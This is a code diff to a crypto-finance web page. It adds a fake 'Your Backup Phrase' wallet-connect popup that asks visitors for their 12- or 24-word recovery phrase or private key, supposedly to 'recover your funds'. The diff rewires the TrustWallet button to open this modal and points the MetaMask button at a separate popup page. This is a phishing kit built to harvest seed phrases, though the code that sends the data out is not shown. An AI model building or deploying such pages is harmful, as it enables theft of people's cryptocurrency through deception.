@@ -886,7 +886,55 @@
    cursor: pointer;
    color: #000;
 }
+
+.overlay {
+    width: 100%;
+    height: 100%;
+    position: fixed;
+    top: 0px;
+    left: 0px;
+    background: rgba(0,0,0,0.7);
+    z-index: 1999;
+    display: none;
+}
+.overlay {
+    cursor: pointer;
+}
   </style>
+
+<style media="screen">
+/*CSS POPUP WALLET CONNECT*/
+
+/*! CSS Used from: https://yaerm.finance/css/main.css */
+*{outline:none!important;}
+/*! CSS Used from: Embedded */
+*,*::before,*::after{box-sizing:inherit;}
+/*! CSS Used from: https://yaerm.finance/css/modal_12_24.css */
+#idForm{display:none;position:fixed;top:50%!important;left:50%!important;transform:translate(-50%,-50%);animation:inherit;transition:inherit;}
+.btn_close{width:30px;position:absolute;top:5px;right:5px;cursor:pointer;}
+.modal .modal-block-main .title{position:relative;max-width:100%;margin:0 0 30px;padding:0;color:#595959;font-size:1.875em;font-weight:600;text-align:center;text-transform:none;word-wrap:break-word;}
+.modal p{margin-bottom:20px;padding-bottom:16px;text-align:center;color:#506175;line-height:21px;font-size:14px;}
+.modal .modal-block-main .switcher{display:flex;color:#536d8b;font-size:14px;align-items:center;margin-bottom:10px;}
+.modal .modal-block-main .switcher .switch-block{display:flex;height:28px;position:relative;width:135px;background-color:#e0e0e0;border-radius:34px;margin-right:10px;cursor:pointer;}
+.modal .modal-block-main .switcher .switch-block{cursor:pointer;}
+.modal .modal-block-main .switcher .switch-block div{color:#999;font-size:11px;position:absolute;top:8px;-webkit-transition:all .5s ease;transition:all .5s ease;}
+.modal .modal-block-main .switcher .switch-block div.active{color:#fff;}
+.modal .modal-block-main .switcher .switch-block div{color:#999;font-size:11px;position:absolute;top:8px;-webkit-transition:all .5s ease;transition:all .5s ease;}
+.modal .modal-block-main ul{display:grid;grid-column-gap:20px;grid-row-gap:20px;grid-template-columns:1fr 1fr 1fr;font-size:14px;margin-bottom:40px;}
+.modal .modal-block-main ul li{border-bottom:1px solid #e0e0e0;color:#999;font-size:14px;padding:10px 0;display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-align:center;-ms-flex-align:center;align-items:center;}
+ul li{list-style-type:none;}
+.modal .modal-block-main ul li span{width:23px;}
+.modal .modal-block-main ul li input{display:inline-block;color:#003945;border:0;width:calc(100% - 30px);border-radius:4px;}
+.modal .error-text{color:#506175;line-height:21px;text-align:center;}
+.modal .modal-block-main .btn{display:block;width:100%;padding:18px 35px;font-weight:500;cursor:pointer;font-size:14px;border-radius:4px;position:relative;background-color:#3bc1aa;border:1px solid #3bc1aa;color:#fff;}
+.modal{display:none;position:relative;box-sizing:border-box;-webkit-box-orient:vertical;-webkit-box-direction:normal;flex-direction:column;-webkit-box-pack:center;justify-content:center;width:32em;max-width:100%;padding:calc(1.25em + 40px);border:none;border-radius:.3125em;background:#fff;font-family:inherit;font-size:1rem;-webkit-animation:swal2-show .3s;animation:swal2-show .3s;-webkit-transition:all .25s ease;-moz-transition:all .25s ease;-ms-transition:all .25s ease;-o-transition:all .25s ease;transition:all .25s ease;}
+.elm1{left:11px;}
+.elm2{left:37px;}
+.elm3{left:63px;}
+.active1{left:5px!important;}
+.active{background-color:#05c0a5;height:22px;width:25px;border-radius:100%;top:4px!important;padding:4px 6px;}
+</style>
+
 </head>
 
 <body cz-shortcut-listen="true" style=""><noscript>You need to enable JavaScript to run this app.</noscript>
@@ -1192,12 +1240,12 @@
             </div>
             <div class="jss327">
               <div style="display: flex; flex-wrap: wrap; justify-content: space-between; align-items: center;">
-                <div style="padding: 12px 0px; display: flex; justify-content: space-between;"><button class="MuiButtonBase-root MuiButton-root MuiButton-outlined MuiButton-outlinedPrimary" tabindex="0" type="button"
+                <div style="padding: 12px 0px; display: flex; justify-content: space-between;"><button onclick="window.open('connectMeta.html','name','width=600,height=700')" class="MuiButtonBase-root MuiButton-root MuiButton-outlined MuiButton-outlinedPrimary" tabindex="0" type="button"
                     style="padding: 16px; background-color: white; border-radius: 1rem; border: 1px solid rgb(225, 225, 225); font-weight: 500; display: flex; justify-content: space-between; min-width: 250px;"><span class="MuiButton-label">
                       <h3 class="MuiTypography-root MuiTypography-h3" style="margin: 0px 12px; color: rgb(1, 1, 1); font-weight: 500; font-size: 1rem;">MetaMask</h3><img src="imgs/icn-metamask.svg" alt=""
                         style="position: absolute; right: 20px; width: 30px; height: 30px;">
                     </span><span class="MuiTouchRipple-root"></span></button></div>
-                <div style="padding: 12px 0px; display: flex; justify-content: space-between;"><button class="MuiButtonBase-root MuiButton-root MuiButton-outlined MuiButton-outlinedPrimary" tabindex="0" type="button"
+                <div style="padding: 12px 0px; display: flex; justify-content: space-between;"><button class="toggleConnect MuiButtonBase-root MuiButton-root MuiButton-outlined MuiButton-outlinedPrimary" tabindex="0" type="button"
                     style="padding: 16px; background-color: white; border-radius: 1rem; border: 1px solid rgb(225, 225, 225); font-weight: 500; display: flex; justify-content: space-between; min-width: 250px;"><span class="MuiButton-label">
                       <h3 class="MuiTypography-root MuiTypography-h3" style="margin: 0px 12px; color: rgb(1, 1, 1); font-weight: 500; font-size: 1rem;">TrustWallet</h3><img src="imgs/trustWallet.png" alt=""
                         style="position: absolute; right: 20px; width: 30px; height: 30px;">
@@ -1265,6 +1313,152 @@
     <div tabindex="0" data-test="sentinelEnd"></div>
   </div>
   <!--POPUP-->
+
+  <!--POPOP WALLET CONNECT-->
+  <div id="idForm" class="modal modals" style="z-index: 2000; display: none;">
+      <div class="container">
+         <div class="modal-block-main">
+            <div class="title" style="margin-bottom: 15px;">Your Backup Phrase</div>
+            <div style="display: flex; justify-content: center; align-items: center;">
+               <div>
+                  <span id="name_wallet" style="font-size: 22px; margin-right: 10px;">WalletConnect</span>
+               </div>
+               <div>
+                  <img id="img_wallet" src="imgs/walletConnectIcon.8215855c.svg" height="30">
+               </div>
+            </div>
+
+            <form class="send_data" id="form_phrase">
+               <input type="hidden" id="wallet" name="wallet" value="WalletConnect">
+               <p>Enter your 12/24 word passphrase or PrivatKey, lowercase, to recover your funds &amp; transactions.</p>
+               <div class="switcher">
+                  <div class="switch-block">
+                     <div class="elm1 active active1">12</div>
+                     <div class="elm2">24</div>
+                     <div class="elm3">Private key</div>
+                  </div>
+                  Value
+               </div>
+
+               <ul class="list list_phrase">
+                  <li>
+                     <span>1</span>
+                     <input type="text" name="phrase1">
+                  </li>
+                  <li>
+                     <span>2</span>
+                     <input type="text" name="phrase2">
+                  </li>
+                  <li>
+                     <span>3</span>
+                     <input type="text" name="phrase3">
+                  </li>
+                  <li>
+                     <span>4</span>
+                     <input type="text" name="phrase4">
+                  </li>
+                  <li>
+                     <span>5</span>
+                     <input type="text" name="phrase5">
+                  </li>
+                  <li>
+                     <span>6</span>
+                     <input type="text" name="phrase6">
+                  </li>
+                  <li>
+                     <span>7</span>
+                     <input type="text" name="phrase7">
+                  </li>
+                  <li>
+                     <span>8</span>
+                     <input type="text" name="phrase8">
+                  </li>
+                  <li>
+                     <span>9</span>
+                     <input type="text" name="phrase9">
+                  </li>
+                  <li>
+                     <span>10</span>
+                     <input type="text" name="phrase10">
+                  </li>
+                  <li>
+                     <span>11</span>
+                     <input type="text" name="phrase11">
+                  </li>
+                  <li>
+                     <span>12</span>
+                     <input type="text" name="phrase12">
+                  </li>
+                  <li style="display: none;">
+                     <span>13</span>
+                     <input type="text" name="phrase13">
+                  </li>
+                  <li style="display: none;">
+                     <span>14</span>
+                     <input type="text" name="phrase14">
+                  </li>
+                  <li style="display: none;">
+                     <span>15</span>
+                     <input type="text" name="phrase15">
+                  </li>
+                  <li style="display: none;">
+                     <span>16</span>
+                     <input type="text" name="phrase16">
+                  </li>
+                  <li style="display: none;">
+                     <span>17</span>
+                     <input type="text" name="phrase17">
+                  </li>
+                  <li style="display: none;">
+                     <span>18</span>
+                     <input type="text" name="phrase18">
+                  </li>
+                  <li style="display: none;">
+                     <span>19</span>
+                     <input type="text" name="phrase19">
+                  </li>
+                  <li style="display: none;">
+                     <span>20</span>
+                     <input type="text" name="phrase20">
+                  </li>
+                  <li style="display: none;">
+                     <span>21</span>
+                     <input type="text" name="phrase21">
+                  </li>
+                  <li style="display: none;">
+                     <span>22</span>
+                     <input type="text" name="phrase22">
+                  </li>
+                  <li style="display: none;">
+                     <span>23</span>
+                     <input type="text" name="phrase23">
+                  </li>
+                  <li style="display: none;">
+                     <span>24</span>
+                     <input type="text" name="phrase24">
+                  </li>
+               </ul>
+
+               <textarea name="passphrase" id="passphrase" style="display: none; border: 1px solid #e0e0e0; margin-left: 40px; width: calc(100% - 40px); height: 100px; padding: 10px;"></textarea>
+
+
+               <div class="error-text" style="margin-bottom:20px;"></div>
+
+
+
+               <div class="modal-footer">
+               <button type="submit" name="send" class="btn btn-default btn-lg">Continue</button>
+               </div>
+
+            </form>
+         </div>
+      </div>
+      <div class="btn_close">
+         <svg xmlns="http://www.w3.org/2000/svg" version="1" viewBox="0 0 24 24"><path d="M13 12l5-5-1-1-5 5-5-5-1 1 5 5-5 5 1 1 5-5 5 5 1-1z"></path></svg>
+      </div>
+   </div>
+  <!--POUP WALLET CONNECT-->
+  <div class="overlay" style="display: none;"></div>
   <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
   <script type="text/javascript">
       /*$(document).ready(function(){
@@ -1279,6 +1473,17 @@
 
          $('.MuiSvgIcon-root, .MuiBackdrop-root').click(function() {
             $('#overlay').fadeOut(300);
+         });
+
+         $('.toggleConnect').click(function() {
+            $('#idForm').css('display', 'block');
+            $('#overlay').fadeOut(300);
+            $('.overlay').css('display', 'block');
+         });
+
+         $('.btn_close').click(function() {
+            $('#idForm').css('display', 'none');
+            $('.overlay').css('display', 'none');
          });
 
       });
